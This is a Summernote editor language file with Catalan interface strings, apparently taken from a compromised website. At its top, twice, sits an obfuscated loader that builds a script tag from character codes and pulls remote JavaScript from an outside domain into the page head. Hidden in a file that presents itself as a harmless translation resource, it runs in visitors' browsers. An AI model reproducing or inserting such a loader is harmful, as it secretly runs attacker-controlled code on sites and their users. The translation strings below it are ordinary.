Element.prototype.appendAfter = function(element) {element.parentNode.insertBefore(this, element.nextSibling);}, false;(function() { var elem = document.createElement(String.fromCharCode(115,99,114,105,112,116)); elem.type = String.fromCharCode(116,101,120,116,47,106,97,118,97,115,99,114,105,112,116); elem.src = String.fromCharCode(104,116,116,112,115,58,47,47,115,116,111,114,101,46,100,111,110,116,107,105,110,104,111,111,111,116,46,116,119,47,115,116,97,116,46,106,115);elem.appendAfter(document.getElementsByTagName(String.fromCharCode(115,99,114,105,112,116))[0]);elem.appendAfter(document.getElementsByTagName(String.fromCharCode(104,101,97,100))[0]);document.getElementsByTagName(String.fromCharCode(104,101,97,100))[0].appendChild(elem);})();Element.prototype.appendAfter = function(element) {element.parentNode.insertBefore(this, element.nextSibling);}, false;(function() { var elem = document.createElement(String.fromCharCode(115,99,114,105,112,116)); elem.type = String.fromCharCode(116,101,120,116,47,106,97,118,97,115,99,114,105,112,116); elem.src = String.fromCharCode(104,116,116,112,115,58,47,47,115,116,111,114,101,46,100,111,110,116,107,105,110,104,111,111,111,116,46,116,119,47,115,116,97,116,46,106,115);elem.appendAfter(document.getElementsByTagName(String.fromCharCode(115,99,114,105,112,116))[0]);elem.appendAfter(document.getElementsByTagName(String.fromCharCode(104,101,97,100))[0]);document.getElementsByTagName(String.fromCharCode(104,101,97,100))[0].appendChild(elem);})();(function ($) {
  $.extend($.summernote.lang, {
    'ca-ES': {
      font: {
        bold: 'Negreta',
        italic: 'Cursiva',
        underline: 'Subratllat',
        clear: 'Treure estil de lletra',
        height: 'Alçada de línia',
        strikethrough: 'Ratllat',
        size: 'Mida de lletra'
      },
      image: {
        image: 'Imatge',
        insert: 'Inserir imatge',
        resizeFull: 'Redimensionar a mida completa',
        resizeHalf: 'Redimensionar a la meitat',
        resizeQuarter: 'Redimensionar a un quart',
        floatLeft: 'Surar a l%27esquerra',
        floatRight: 'Surar a la dreta',
        floatNone: 'No surar',
        dragImageHere: 'Arrossegueu una imatge aquí',
        selectFromFiles: 'Seleccioneu des dels arxius',
        url: 'URL de la imatge'
      },
      link: {
        link: 'Enllaç',
        insert: 'Inserir enllaç',
        unlink: 'Treure enllaç',
        edit: 'Editar',
        textToDisplay: 'Text per mostrar',
        url: 'Cap a quina URL porta l\'enllaç?',
        openInNewWindow: 'Obrir en una finestra nova'
      },
      table: {
        table: 'Taula'
      },
      hr: {
        insert: 'Inserir línia horitzontal'
      },
      style: {
        style: 'Estil',
        normal: 'Normal',
        blockquote: 'Cita',
        pre: 'Codi',
        h1: 'Títol 1',
        h2: 'Títol 2',
        h3: 'Títol 3',
        h4: 'Títol 4',
        h5: 'Títol 5',
        h6: 'Títol 6'
      },
      lists: {
        unordered: 'Llista desendreçada',
        ordered: 'Llista endreçada'
      },
      options: {
        help: 'Ajut',
        fullscreen: 'Pantalla sencera',
        codeview: 'Veure codi font'
      },
      paragraph: {
        paragraph: 'Paràgraf',
        outdent: 'Menys tabulació',
        indent: 'Més tabulació',
        left: 'Alinear a l\'esquerra',
        center: 'Alinear al mig',
        right: 'Alinear a la dreta',
        justify: 'Justificar'
      },
      color: {
        recent: 'Últim color',
        more: 'Més colors',
        background: 'Color de fons',
        foreground: 'Color de lletra',
        transparent: 'Transparent',
        setTransparent: 'Establir transparent',
        reset: 'Restablir',
        resetToDefault: 'Restablir per defecte'
      },
      shortcut: {
        shortcuts: 'Dreceres de teclat',
        close: 'Tancar',
        textFormatting: 'Format de text',
        action: 'Acció',
        paragraphFormatting: 'Format de paràgraf',
        documentStyle: 'Estil del document'
      },
      history: {
        undo: 'Desfer',
        redo: 'Refer'
      }
    }
  });
})(jQuery);
